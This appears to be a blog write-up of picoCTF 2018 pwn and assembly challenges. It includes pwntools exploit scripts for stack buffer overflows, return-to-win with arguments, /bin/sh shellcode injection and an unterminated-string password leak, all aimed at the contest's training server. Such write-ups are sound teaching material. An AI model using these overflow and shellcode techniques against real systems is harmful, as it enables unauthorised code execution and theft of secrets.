---
title: "picoCTF 2018: Pwn and Assembly Challenges"
date: 2018-09-28
description: "picoCTF 2018 solutions for pwn and assembly challenges: buffer overflow series, x86 assembly tasks, and shellcode execution"
tags: ["picoCTF", "pwn", "buffer-overflow", "assembly", "shellcode", "CTF"]
platform: "ctf"
category: "pwn"
difficulty: "easy"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Buffer Overflow 0 — 150 pts

The challenge provides source code and a binary to demonstrate understanding of buffer overflows.

The key pieces are a `sigsegv_handler` function and the main input routine. `sigsegv_handler` is registered as the SIGSEGV signal handler — when a segmentation fault occurs, it prints the flag to stderr instead of crashing normally.

The solution is to provide more input than the buffer can hold, triggering a segfault, which fires the handler and prints the flag.

```bash
python -c 'print "A"*200' | ./vuln
```

---

## Buffer Overflow 1 — 200 pts

The binary contains a `vuln()` function that reads input with `gets()`, and a separate `win()` function that prints the flag. The goal is to overwrite the return address of `vuln` to jump to `win`.

After downloading the binary and debugging locally to find the exact offset:

```
buf[32] + padding[12] = 44 bytes to reach ret
```

Stack layout: `buffer[32] | saved regs[12] | ret[4]`

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

win = 0x080485cb

payload = ""
payload += "A" * 44
payload += p32(win)

p.sendline(payload)
p.interactive()
```

---

## Buffer Overflow 2 — 250 pts

Same structure as Buffer Overflow 1 but `win()` requires two specific arguments to print the flag:

```c
void win(int arg1, int arg2) {
    if (arg1 == 0xDEADBEEF && arg2 == 0xDEADC0DE)
        // print flag
}
```

This is a Return-to-Library (RTL) technique. When calling a function via return address overwrite on x86-32, arguments are passed on the stack after the fake return address.

Payload layout:

```
buffer[100] | dummy[12] | win_addr[4] | fake_ret[4] | arg1[4] | arg2[4]
```

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

win = 0x08048676

payload = ""
payload += "A" * 112
payload += p32(win)
payload += "AAAA"          # fake return address for win()
payload += p32(0xDEADBEEF) # arg1
payload += p32(0xDEADC0DE) # arg2

p.sendline(payload)
p.interactive()
```

---

## Assembly 0 — 150 pts

The challenge presents x86 assembly and asks for the return value of the function.

The assembly performs simple register operations that can be translated directly to C:

```c
int f(int a, int b) {
    return a + b; // or equivalent operation
}
```

The flag is the decimal return value of the function with the given inputs.

---

## Assembly 1 — 200 pts

A longer assembly sequence with a loop. Input value is `0x255`. The assembly can be translated to C using `goto` statements to represent the conditional jumps:

```c
int f(int x) {
    int result = 0;
    again:
        if (x <= 0) return result;
        result += x;
        x--;
        goto again;
}
```

Running with `x = 0x255 = 597`:

```python
x = 0x255
result = 0
while x > 0:
    result += x
    x -= 1
print(result)
```

The return value becomes the flag after formatting.

---

## Assembly 2 — 250 pts

Another hand-tracing exercise with a more complex assembly snippet involving multiple registers and memory operations. The approach is the same: translate each instruction to C, track register states, and compute the final `eax` value.

---

## Assembly 3 — 400 pts

This challenge cannot be solved purely by hand-tracing due to complex `al`/`ah` byte register operations.

The intended approach: treat the provided assembly as shellcode, cast it to a function pointer, and execute it to observe the return value directly.

```c
#include <stdio.h>
#include <string.h>

int main() {
    // assembly bytes from the challenge
    char shellcode[] = "\x...";
    
    int (*fp)(int, int, int) = (int (*)(int, int, int))(void *)shellcode;
    printf("%d\n", fp(arg1, arg2, arg3));
    return 0;
}
```

Compile with `-z execstack` to allow stack execution, run it, and read the return value as the flag.

---

## Shellcode — 200 pts

The binary reads input with `gets()` into a buffer, then executes the buffer as code:

```c
void vuln() {
    char buf[64];
    gets(buf);
    // executes buf as a function
    ((void(*)())buf)();
}
```

The `((void(*)())buf)()` cast makes the buffer directly executable — classic shellcode injection. Since NX is disabled, shellcode placed in the buffer runs when the function pointer is called.

A standard Linux x86 `/bin/sh` shellcode works here:

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

---

## Leak Me — 200 pts

The binary reads a name with `fgets()` and strips the trailing newline by setting the last character to null. It then reads a password from a file and prompts for user input to verify it.

The vulnerability is the null-byte removal. When the name buffer is filled to capacity, `fgets` places a null terminator at position `name[255]`. The code then sets `name[strlen(name) - 1] = '\0'`, which removes the last null — leaving the name buffer without termination. The subsequent `puts(name)` then reads past the buffer boundary into the adjacent `password` array.

Stack layout:

```
name[256] | password[64] | input_password[64]
```

By filling `name` completely (256 bytes), the null stripping leaves the buffer unterminated, and `puts` leaks the password stored right after it.

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

# Fill name buffer completely to cause null stripping
p.sendline("A" * 256)

# Read leaked output — password follows name in memory
output = p.recvline()
leaked_password = output[256:].split('\n')[0]
print("Leaked password:", leaked_password)

# Now authenticate normally
p.sendline(leaked_password)
p.interactive()
```
